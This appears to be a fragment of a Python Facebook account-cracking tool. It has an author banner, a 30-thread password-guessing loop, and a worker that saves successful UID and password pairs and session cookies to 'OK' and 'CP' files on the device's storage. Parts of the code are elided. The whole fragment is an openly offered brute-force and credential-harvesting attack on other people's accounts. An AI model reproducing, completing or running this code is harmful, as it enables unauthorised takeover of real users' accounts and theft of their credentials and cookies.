...
╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝ 
  ...
  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                     
  Tools Create By 𝐍𝐀𝐇𝐈𝐃
  My Github Account Name 𝐋𝐀𝐃𝐈𝐍 𝐒𝐊
  My Fb Group 𝐈𝐍𝐃𝐈𝐀 𝐂𝐘𝐁𝐄𝐑 𝐒𝐄𝐂𝐔𝐑𝐈𝐓𝐘 𝐅𝐎𝐑𝐂𝐄                                                                                      
  My Id Name 𝐌𝐝. 𝐒𝐚𝐢𝐟𝐮𝐥 𝐈𝐬𝐥𝐚𝐦
  Tools Status Random
  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
""")
...
def fuck():
    ...
    with ThreadPool(max_workers=30) as asha:
        ...
        for love in user:
            ...
            asha.submit(𝐍𝐀𝐇𝐈𝐃,uid,pwx,tl)
    print('-------------------')
    print(' [✓] Crack process has been completed')
    print(' [✓] OK Ids saved as 𝐍𝐀𝐇𝐈𝐃-OK.txt')
    print(' [✓] CP Id Save as 𝐍𝐀𝐇𝐈𝐃-CP.txt')
    print('-------------------')
def 𝐍𝐀𝐇𝐈𝐃(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[𝐍𝐀𝐇𝐈𝐃]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"[𝐍𝐀𝐇𝐈𝐃-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/𝐍𝐀𝐇𝐈𝐃-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"[𝐍𝐀𝐇𝐈𝐃-CP] {cid}|{ps}")
                open('/sdcard/𝐍𝐀𝐇𝐈𝐃-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
